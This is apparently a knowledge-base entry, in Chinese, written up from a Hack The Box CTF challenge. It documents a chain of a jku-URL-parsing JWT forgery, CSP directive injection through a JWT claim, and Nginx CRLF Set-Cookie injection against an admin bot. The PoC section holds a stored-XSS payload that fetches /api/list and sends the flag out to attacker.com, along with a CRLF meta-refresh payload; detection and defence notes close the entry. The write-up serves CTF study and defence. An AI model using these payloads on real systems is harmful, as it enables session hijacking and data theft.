---
id: ctf-web-bot-jku-csp-crlf-cookie-hijack-chain
title: CTF Bot 链：jku 伪造 admin JWT + CSP report-uri 注入 + Nginx CRLF 替换 Cookie 外带 Flag
type: scenario
domain: ctf
path: ctf/web
technique: bot-jku-csp-crlf-chain
aliases:
- BoneChewerCon 链
- Bot Cookie 劫持链
- CSP 注入 + CRLF Set-Cookie
- jku 伪造 + XSS 外带
- admin bot 三道控制绕过
tags:
- ctf
- web
- jwt
- jku
- csp
- crlf
- xss
- bot
- exploit-chain
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T11:54:44+08:00'
  notes: 已对照原文与8张图核对：jku 白名单用 split('@')[1] 取到 localhost 而 requests 按最后一个 @ 请求攻击者 JWKS；CSP 的 report-uri 拼接 JWT token claim 注入 script-src/connect-src；Bot 经 nginx error_page 302 Location 的 %0d%0a 注入 Set-Cookie 换为攻击者 JWT，二次加载 /list 后存储型 XSS 外带 /api/list 中 admin idea；图01显示挑战已解出，末段日志有 GET /.well-known/jwks.json 与 GET /?leak=HTB%7B...%7D。未验证点：PoC 未在本机执行；CTF 环境非通用产品，Nginx 行为随版本可能不同。frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

在“管理 Bot 定期访问列表页”的 CTF 场景中，可先用 jku 白名单的 URL 解析差异伪造 admin JWT，再用 JWT 自定义 claim 注入 CSP 的 `script-src`/`connect-src`，最后用 Nginx 302 `Location` 的 CRLF 注入 `Set-Cookie` 把 Bot 的 Cookie 替换成该 JWT，使存储型 XSS 在 Bot 浏览器中执行并外带 Flag。

## 原理

- 目标同时设置了三道控制：JWT 身份校验、仅允许 `127.0.0.1` 访问 `/list`、CSP 限制脚本与网络请求；直接访问 `/list` 会因 IP 校验失败，伪造普通 JWT 也无法通过 admin 校验。
- **第一道（JWT）**：服务端从 `jku` 拉取 JWKS 验签，但域名校验用首个 `@` 切分，而 `requests` 用最后一个 `@` 解析主机；`http://x@localhost@attacker/.well-known/jwks.json` 让校验看到 `localhost`、请求落到攻击者 JWKS，从而用攻击者私钥签出 `username=admin` 的 JWT。
- **第二道（CSP）**：CSP 由 `report-uri /api/csp-report?token=<JWT token claim>` 拼接而成；把 claim 设为 `foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;`，即可追加更具体的 `script-src`/`connect-src` 覆盖 `default-src 'self'`，让内联 XSS 执行并允许向任意域外带。
- **第三道（本地访问）**：攻击者无法直接改 Bot 的随机 admin token，但可以让 Bot 自己访问一个 404 路径。Nginx 在 `error_page` 的 `@notfound` 中用 `$uri` 拼接 302 `Location`，未过滤 CRLF；路径中注入 `Set-Cookie: auth=<攻击者 JWT>` 后，Bot 收到 302 时会写入该 Cookie，后续请求即以攻击者伪造的 admin 身份访问。
- **收尾**：提交的 idea 无过滤地进入 `presentations` 表并在 `/list` 渲染；Bot 执行页面 JS，读取 `/api/list` 中 admin 的 Flag，再 `fetch` 到攻击者服务器。三道控制被逐一绕过，形成完整链。

## 触发条件

- 存在会以管理员身份、从本机访问列表页的 Bot（或等价的高权限浏览器会话）。
- 列表内容存在存储型 XSS，且攻击者可提交内容。
- JWT 使用可外部指定 `jku` 的 RS256 验签，且白名单可被 URL 解析差异绕过。
- CSP 由 JWT claim 等可控值拼接，允许注入指令。
- 反代/Nginx 在重定向 Location 中拼接未过滤的 URI，且 Bot 会跟随 302 并接受 Set-Cookie。
- 攻击者能托管 JWKS 与接收外带请求的服务器。

## 利用步骤

1. 侦察：确认 JWT Header 含 `jku`/`kid`，`/list` 仅本地可访问，CSP 中 `report-uri` 回显 token claim，404 路径会 302 到 `error_path=<uri>`。
2. 生成攻击者 RSA 密钥对，托管 JWKS；构造 `jku` 为 `http://x@localhost@attacker/.well-known/jwks.json`，签发 `username=admin` 且 token claim 含 CSP 注入串的 JWT。
3. 验证伪造 JWT 能通过 admin 校验（在本地/可访问路径测试），确认 CSP 头出现注入的 `script-src`/`connect-src`。
4. 构造存储型 XSS 载荷：先通过 `meta refresh` 或 `fetch` 触发带 CRLF 的 404 URL，让 Bot 的 Cookie 被替换；再用 `fetch('/api/list')` 取 admin 的 idea（Flag），外带到攻击者域名。
5. 把载荷作为 idea 提交，等待 Bot 周期访问 `/list`。
6. 在攻击者服务器日志中确认 JWKS 拉取与 `?leak=<flag>` 外带请求。

## PoC

```html
<img src=x onerror="fetch('/api/list').then(r=>r.json()).then(d=>{let f=d.submissions.find(s=>s.user==='admin').idea;fetch('https://attacker.com/?leak='+encodeURIComponent(f))})">
<meta http-equiv="refresh" content="3;URL=/list/foo%0D%0ASet-Cookie%3A%20auth%3d<JWT>%3Bpath%3D%2Flist%0d%0a">
```

说明：原文在 HTB BoneChewerCon 挑战中按上述顺序打通，攻击者服务器收到 `GET /.well-known/jwks.json` 与 `GET /?leak=HTB{...}` 两条日志；PoC 未在本会话执行，`<JWT>` 需替换为伪造 token。

## 变体与关联

- **缺一环则断链**：无 jku 解析差异 → 无法伪造 admin；无 CSP 注入 → 内联 XSS 被拦；无 CRLF → Bot 仍用随机 admin token，攻击者无法控制其页面上下文。
- **Bot 机制的替代**：若 Bot 直接以管理员 Cookie 访问攻击者可控 URL，可省去 CRLF；若 CSP 使用 nonce/hash，则需另找绕过。
- **其他外带方式**：`img`/`fetch`/`navigator.sendBeacon`/WebSocket；CSP 注入 `connect-src *` 后可自由选择。
- 关联：[[web-generic-jwt-jku-header-hijack]]、[[web-generic-ssrf-url-userinfo-prefix-allowlist-bypass]]（jku 多 @ 绕过所依赖的 userinfo 语义）、[[web-generic-xss-csp-report-uri-claim-injection]]、[[web-generic-crlf-nginx-uri-location-set-cookie]]、[[web-generic-xss-admin-blind-stored-registration]]。

## 检测与防御

- **检测**：JWT `jku` 含多个 `@` 或外部主机；CSP 头出现重复/注入的 `script-src`、`connect-src`；请求 URI 含 `%0d%0a` 且响应出现异常 `Set-Cookie`；Bot 访问 404 路径后 Cookie 变化；页面出现向外部域发起的 fetch。
- **防御**：jku 使用固定配置并严格解析 host；CSP 结构化生成、使用 nonce/hash、禁止用户输入进入头值；Location 不拼接 `$uri`，拒绝 CR/LF；Bot 使用独立浏览器上下文并在访问后清理 Cookie；对提交内容做 HTML 编码与 CSP 双重防护。
